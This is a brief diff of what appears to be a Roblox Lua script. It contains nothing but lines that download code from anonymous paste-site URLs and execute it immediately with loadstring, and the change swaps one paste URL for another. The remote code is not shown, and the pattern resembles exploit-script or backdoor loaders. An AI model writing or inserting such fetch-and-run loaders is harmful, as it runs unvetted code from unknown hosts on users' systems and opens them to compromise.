@@ -3,7 +3,6 @@ local fenv = getfenv()
 task.spawn(function()
     loadstring(game:HttpGet("https://cdn.sourceb.in/bins/frFvztQ8JR/0"))()
 end)
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216703"))()
-
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216049"))()
 
 
